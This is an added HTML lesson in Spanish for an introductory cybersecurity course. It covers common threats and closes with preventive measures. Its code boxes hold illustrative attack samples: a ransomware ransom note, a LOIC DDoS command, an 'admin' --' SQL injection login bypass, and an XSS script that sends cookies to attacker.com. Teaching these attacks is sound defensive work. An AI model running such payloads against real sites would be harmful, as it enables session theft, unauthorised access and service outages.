@@ -1,0 +1,196 @@
+
+<h2>Amenazas Comunes en Ciberseguridad</h2>
+
+<p>En el mundo de la ciberseguridad, conocer las amenazas es el primer paso para protegerse contra ellas. A medida que la tecnología evoluciona, también lo hacen las técnicas utilizadas por los ciberdelincuentes para comprometer sistemas y datos. Esta lección explora las amenazas más comunes que debes conocer.</p>
+
+<h3>Malware: Software Malicioso</h3>
+
+<p>El malware, abreviatura de "software malicioso", es cualquier programa o código diseñado específicamente para dañar, interrumpir o obtener acceso no autorizado a sistemas informáticos. Existen varios tipos:</p>
+
+<div class="bg-red-900 p-5 rounded-lg my-6">
+  <h4 class="text-white font-bold mb-3">Principales tipos de malware</h4>
+  
+  <div class="space-y-4">
+    <div>
+      <h5 class="text-red-200 font-bold">Virus</h5>
+      <p class="text-gray-200">Código malicioso que se adjunta a programas legítimos y se propaga cuando se ejecuta el programa infectado. Requieren intervención humana para propagarse.</p>
+    </div>
+    
+    <div>
+      <h5 class="text-red-200 font-bold">Troyanos</h5>
+      <p class="text-gray-200">Software que parece legítimo pero contiene código malicioso. No se replican a sí mismos, pero pueden crear puertas traseras para accesos futuros.</p>
+    </div>
+    
+    <div>
+      <h5 class="text-red-200 font-bold">Ransomware</h5>
+      <p class="text-gray-200">Malware que cifra los archivos del usuario y exige un pago (rescate) para restaurar el acceso. Ejemplos notables incluyen WannaCry y Petya.</p>
+      <pre class="bg-gray-800 text-green-400 p-2 mt-2 rounded overflow-x-auto text-sm">
+# Ejemplo de mensaje de ransomware
+YOUR FILES HAVE BEEN ENCRYPTED!
+To decrypt your files, send 0.5 BTC to the following address:
+1AbC...XyZ
+After payment, contact decrypt@malware.com with your unique ID: 938A7F</pre>
+    </div>
+    
+    <div>
+      <h5 class="text-red-200 font-bold">Spyware</h5>
+      <p class="text-gray-200">Software que espía las actividades del usuario, recopilando información como contraseñas, hábitos de navegación y datos personales.</p>
+    </div>
+    
+    <div>
+      <h5 class="text-red-200 font-bold">Gusanos</h5>
+      <p class="text-gray-200">Malware autorreplicante que se propaga a través de redes sin intervención humana, consumiendo ancho de banda y recursos del sistema.</p>
+    </div>
+  </div>
+</div>
+
+<h3>Phishing y Ataques de Ingeniería Social</h3>
+
+<p>La ingeniería social es el arte de manipular psicológicamente a las personas para que revelen información confidencial o realicen acciones específicas. El phishing es una de las técnicas más comunes:</p>
+
+<ul>
+  <li><strong>Phishing por correo electrónico:</strong> Mensajes que suplantan a entidades legítimas (bancos, servicios online) para obtener credenciales o información sensible.</li>
+  <li><strong>Spear phishing:</strong> Ataques de phishing dirigidos y personalizados para objetivos específicos.</li>
+  <li><strong>Whaling:</strong> Ataques dirigidos específicamente a ejecutivos o personas de alto nivel.</li>
+  <li><strong>Vishing:</strong> Phishing a través de llamadas telefónicas.</li>
+  <li><strong>Smishing:</strong> Phishing mediante mensajes SMS.</li>
+</ul>
+
+<div class="bg-gray-800 p-4 rounded-lg my-5 border-l-4 border-yellow-400">
+  <h4 class="text-yellow-400 font-bold">Caso de estudio: Ataque de phishing</h4>
+  <p class="text-gray-300 mt-2">En 2016, John Podesta, jefe de campaña de Hillary Clinton, fue víctima de un ataque de phishing que resultó en la filtración de miles de correos electrónicos. Un simple correo electrónico falso que imitaba a Google solicitando cambiar su contraseña llevó a una de las brechas de seguridad más notables en la política estadounidense reciente.</p>
+</div>
+
+<h3>Man-in-the-Middle (MitM)</h3>
+
+<p>Los ataques Man-in-the-Middle ocurren cuando un atacante se posiciona entre dos partes que se comunican, interceptando y posiblemente alterando la información que se transmite:</p>
+
+<ol>
+  <li>El atacante intercepta la comunicación entre la víctima y el servidor legítimo.</li>
+  <li>El atacante puede leer, insertar y modificar los datos en tránsito sin que las partes lo sepan.</li>
+  <li>Este tipo de ataques son especialmente peligrosos en redes Wi-Fi públicas y no seguras.</li>
+</ol>
+
+<div class="flex justify-center my-6">
+  <img src="https://cybersecurityventures.com/wp-content/uploads/2022/04/man-in-the-middle-attacks.png" alt="Diagrama de ataque Man-in-the-Middle" class="rounded-lg shadow-lg" />
+</div>
+
+<h3>Ataques de Denegación de Servicio (DoS y DDoS)</h3>
+
+<p>Estos ataques buscan saturar un sistema, servicio o red para que no esté disponible para los usuarios legítimos:</p>
+
+<ul>
+  <li><strong>DoS (Denegación de Servicio):</strong> Ataque desde una única fuente.</li>
+  <li><strong>DDoS (Denegación de Servicio Distribuida):</strong> Ataque coordinado desde múltiples fuentes, generalmente utilizando una botnet (red de dispositivos infectados).</li>
+</ul>
+
+<pre class="bg-gray-800 text-green-400 p-4 my-4 rounded overflow-x-auto">
+# Ejemplo de comando LOIC (Low Orbit Ion Cannon) para DDoS
+# NO EJECUTAR - SOLO CON FINES EDUCATIVOS
+python loic.py --target www.ejemplo.com --port 80 --method HTTP</pre>
+
+<div class="bg-blue-900 p-4 rounded-lg my-5">
+  <h4 class="text-white font-bold">Métodos comunes de ataques DDoS</h4>
+  <ul class="list-disc pl-5 text-blue-100 mt-2">
+    <li><strong>SYN Flood:</strong> Envía gran cantidad de solicitudes de conexión TCP SYN sin completar el protocolo de enlace de tres vías.</li>
+    <li><strong>UDP Flood:</strong> Inunda puertos con paquetes UDP para saturar el ancho de banda.</li>
+    <li><strong>HTTP Flood:</strong> Sobrecarga servidores web con solicitudes HTTP GET o POST aparentemente legítimas.</li>
+    <li><strong>Amplificación DNS:</strong> Utiliza servidores DNS para amplificar el tráfico dirigido a la víctima.</li>
+  </ul>
+</div>
+
+<h3>Inyecciones SQL</h3>
+
+<p>La inyección SQL es una técnica que aprovecha vulnerabilidades en la validación de entrada para insertar código SQL malicioso en consultas que se envían a bases de datos:</p>
+
+<ul>
+  <li>Permite a los atacantes acceder, modificar o eliminar datos no autorizados.</li>
+  <li>Puede comprometer la integridad de la base de datos entera.</li>
+  <li>Se previene principalmente mediante la validación adecuada de entradas y el uso de consultas parametrizadas.</li>
+</ul>
+
+<pre class="bg-gray-800 text-green-400 p-4 my-4 rounded overflow-x-auto">
+# Ejemplo de inyección SQL básica
+# En un campo de inicio de sesión:
+
+Username: admin' --
+Password: cualquiercosa
+
+# El código SQL resultante sería:
+SELECT * FROM usuarios WHERE username = 'admin' -- ' AND password = 'hash_password'
+
+# Los caracteres -- comentan el resto de la consulta, permitiendo el acceso sin conocer la contraseña</pre>
+
+<h3>Ataques de Fuerza Bruta</h3>
+
+<p>Los ataques de fuerza bruta intentan descubrir contraseñas o claves mediante prueba y error, probando sistemáticamente todas las combinaciones posibles hasta encontrar la correcta:</p>
+
+<ul>
+  <li><strong>Ataque de diccionario:</strong> Usa una lista de palabras comunes.</li>
+  <li><strong>Ataque híbrido:</strong> Combina el ataque de diccionario con permutaciones.</li>
+  <li><strong>Fuerza bruta pura:</strong> Prueba todas las combinaciones posibles de caracteres.</li>
+</ul>
+
+<div class="bg-yellow-900 p-6 rounded-lg my-6">
+  <h4 class="text-yellow-200 font-bold mb-2">CONSEJO DE SEGURIDAD:</h4>
+  <p class="text-yellow-100">Utiliza contraseñas fuertes: mínimo 12 caracteres, combinando mayúsculas, minúsculas, números y símbolos. La autenticación de dos factores (2FA) añade una capa adicional de seguridad que hace que los ataques de fuerza bruta sean prácticamente inútiles, incluso si la contraseña es descubierta.</p>
+</div>
+
+<h3>Cross-Site Scripting (XSS)</h3>
+
+<p>Los ataques XSS implican la inyección de scripts maliciosos en sitios web confiables. Cuando un usuario visita el sitio comprometido, el script se ejecuta en su navegador:</p>
+
+<ul>
+  <li><strong>XSS Persistente (Almacenado):</strong> El código malicioso se almacena en el servidor (por ejemplo, en un comentario) y se ejecuta cada vez que un usuario carga la página afectada.</li>
+  <li><strong>XSS Reflejado:</strong> El código malicioso se envía a través de la URL y se ejecuta inmediatamente cuando la víctima hace clic en un enlace manipulado.</li>
+  <li><strong>XSS basado en DOM:</strong> La vulnerabilidad existe en el código del lado del cliente y no requiere que los datos maliciosos se envíen al servidor.</li>
+</ul>
+
+<pre class="bg-gray-800 text-green-400 p-4 my-4 rounded overflow-x-auto">
+# Ejemplo simple de ataque XSS
+# En un campo de comentario de un blog:
+
+&lt;script&gt;
+  document.addEventListener('DOMContentLoaded', function() {
+    var token = document.cookie;
+    var img = new Image();
+    img.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(token);
+  });
+&lt;/script&gt;</pre>
+
+<h3>Amenazas internas</h3>
+
+<p>No todas las amenazas provienen del exterior. Los empleados, contratistas o socios comerciales con acceso legítimo a los sistemas pueden representar un riesgo significativo:</p>
+
+<ul>
+  <li>Empleados descontentos que buscan venganza</li>
+  <li>Usuarios internos que accidentalmente comprometen la seguridad</li>
+  <li>Insiders maliciosos contratados o sobornados por competidores u otros actores externos</li>
+</ul>
+
+<h3>Conclusión y medidas preventivas</h3>
+
+<p>Comprender las amenazas es fundamental para defenderse contra ellas. Algunas medidas preventivas básicas incluyen:</p>
+
+<ol>
+  <li>Mantener software y sistemas actualizados con los últimos parches de seguridad</li>
+  <li>Utilizar soluciones antivirus y firewalls actualizados</li>
+  <li>Implementar políticas de contraseñas fuertes y autenticación de múltiples factores</li>
+  <li>Capacitar regularmente a los usuarios sobre amenazas y prácticas seguras</li>
+  <li>Realizar copias de seguridad periódicas de datos importantes</li>
+  <li>Implementar el principio de menor privilegio para el acceso a sistemas</li>
+  <li>Monitorizar y auditar regularmente los sistemas para detectar actividades sospechosas</li>
+</ol>
+
+<div class="bg-purple-900 p-6 rounded-lg my-6">
+  <h4 class="text-white font-bold mb-3">Herramientas básicas para protegerse</h4>
+  <ul class="list-disc pl-5 text-purple-100">
+    <li><strong>Firewalls:</strong> Bloquean el acceso no autorizado mientras permiten comunicaciones legítimas.</li>
+    <li><strong>Antivirus:</strong> Detectan y eliminan malware conocido.</li>
+    <li><strong>VPN:</strong> Cifra la conexión a internet, especialmente útil en redes Wi-Fi públicas.</li>
+    <li><strong>Gestores de contraseñas:</strong> Generan y almacenan contraseñas seguras y únicas para cada servicio.</li>
+    <li><strong>Software 2FA:</strong> Añade una capa adicional de seguridad al proceso de autenticación.</li>
+  </ul>
+</div>
+
+<p>En la siguiente lección, exploraremos los modelos de seguridad fundamentales que ayudan a estructurar nuestra aproximación a la ciberseguridad de manera sistemática y efectiva.</p>
